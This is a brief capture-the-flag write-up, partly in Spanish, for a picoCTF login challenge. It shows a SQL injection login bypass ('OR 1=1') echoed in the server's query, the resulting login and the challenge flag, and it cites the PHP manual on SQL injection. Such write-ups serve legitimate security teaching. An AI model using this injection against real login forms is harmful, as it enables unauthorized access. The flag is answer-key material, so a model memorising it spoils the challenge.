## Objetivo
There is a website running at `https://jupiter.challenges.picoctf.org/problem/39720/` ([link](https://jupiter.challenges.picoctf.org/problem/39720/)) or http://jupiter.challenges.picoctf.org:39720. Do you think you can log us in? Try to see if you can login!
## Solución
```
username: 
password: 
SQL query: SELECT * FROM users WHERE name='' OR 1=1'; AND password=''

# Logged in!

Your flag is: picoCTF{s0m3_SQL_c218b685}
```
## Notas adicionales

## Referencias
+ [PHP: Inyección de SQL - Manual](https://www.php.net/manual/es/security.database.sql-injection.php)